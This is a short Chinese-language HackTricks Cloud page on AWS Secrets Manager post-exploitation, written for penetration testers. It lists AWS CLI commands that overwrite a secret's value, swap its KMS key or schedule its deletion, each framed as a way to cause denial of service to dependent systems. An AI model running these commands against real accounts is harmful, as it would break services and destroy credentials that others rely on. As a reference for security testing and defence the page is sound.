# AWS - Secrets Manager Post Exploitation

{{#include ../../../banners/hacktricks-training.md}}

## Secrets Manager

有关更多信息，请查看：

{{#ref}}
../aws-services/aws-secrets-manager-enum.md
{{#endref}}

### 读取秘密

**秘密本身是敏感信息**，[查看权限提升页面](../aws-privilege-escalation/aws-secrets-manager-privesc.md)以了解如何读取它们。

### DoS 更改秘密值

更改秘密的值可能会**导致所有依赖该值的系统出现 DoS。**

> [!WARNING]
> 请注意，之前的值也会被存储，因此很容易回到之前的值。
```bash
# Requires permission secretsmanager:PutSecretValue
aws secretsmanager put-secret-value \
--secret-id MyTestSecret \
--secret-string "{\"user\":\"diegor\",\"password\":\"EXAMPLE-PASSWORD\"}"
```
### DoS 更改 KMS 密钥
```bash
aws secretsmanager update-secret \
--secret-id MyTestSecret \
--kms-key-id arn:aws:kms:us-west-2:123456789012:key/EXAMPLE1-90ab-cdef-fedc-ba987EXAMPLE
```
### DoS 删除秘密

删除秘密的最少天数为 7
```bash
aws secretsmanager delete-secret \
--secret-id MyTestSecret \
--recovery-window-in-days 7
```
{{#include ../../../banners/hacktricks-training.md}}
